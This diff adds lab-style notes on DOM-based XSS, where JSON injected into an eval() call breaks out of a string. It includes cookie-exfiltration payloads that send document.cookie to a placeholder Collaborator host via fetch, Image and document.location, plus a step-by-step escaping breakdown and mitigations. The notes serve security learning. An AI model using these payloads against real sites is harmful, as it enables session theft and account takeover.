@@ -102,3 +102,87 @@ function handleResponse() {
 ## Quick Reference
 
 Replace `burp.oastify.com` with your Burp Collaborator URL!
+
+
+# DOM-Based XSS via JSON Injection into eval()
+
+## Vulnerability Overview
+The application uses `eval()` to parse JSON response containing user input, allowing JavaScript injection through JSON string escaping.
+
+## Vulnerable Code
+```javascript
+xhr.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        eval('var searchResultsObj = ' + this.responseText);
+        displaySearchResults(searchResultsObj);
+    }
+};
+```
+
+## Attack Vector
+
+### Payload
+```
+/?search=\%22};fetch(`https://YOUR-COLLABORATOR.com?c=${document.cookie}`);//
+```
+
+### How It Works
+
+**Step 1: URL Parameter**
+```
+search=\%22};fetch(`https://...`);//
+```
+
+**Step 2: Server Response (JSON)**
+```json
+{"results":[],"searchTerm":"\\"};fetch(`https://...`);//"}
+```
+
+**Step 3: eval() Executes**
+```javascript
+var searchResultsObj = {"results":[],"searchTerm":"\\"};fetch(`https://...`);//"}
+```
+
+**Breakdown:**
+- `"\\"` - In JSON string, `\\` = single backslash, `\"` = escaped quote
+- When JavaScript evaluates this: `\\"` becomes literal `\"` in the string
+- The `\"` ends the string value for `searchTerm`
+- `}` closes the object
+- `;` ends the variable declaration
+- `fetch(...)` executes arbitrary JavaScript
+- `;//"` comments out the trailing `"}`
+
+## Key Concepts
+
+### Double Escaping
+- **URL**: `\%22` (backslash + URL-encoded quote)
+- **JSON**: `\\"` (escaped backslash + quote in JSON)
+- **Evaluated JS**: `\"` (literal backslash-quote in string, which ends the string)
+
+### Why This Works
+1. The backslash in JSON (`\\`) becomes a literal `\` character
+2. The quote after it (`"`) is NOT escaped in the JavaScript string literal context
+3. This unescaped quote breaks out of the string
+4. The rest is valid JavaScript that executes
+
+## Alternative Payloads
+
+```
+# Using Image for exfiltration
+/?search=\%22};new%20Image().src=`https://COLLAB?c=${document.cookie}`;//
+
+# Using document.location (redirects)
+/?search=\%22};document.location=`https://COLLAB?c=${document.cookie}`;//
+
+# Using alert for POC
+/?search=\%22};alert(document.domain);//
+```
+
+## Mitigation
+- **Never use eval()** on user-controlled data
+- Use `JSON.parse()` instead of `eval()` for JSON
+- Implement proper output encoding
+- Use Content Security Policy (CSP) to prevent inline script execution
+
+## Root Cause
+Using `eval()` to parse JSON instead of `JSON.parse()`, combined with insufficient input validation/sanitization on the server side.
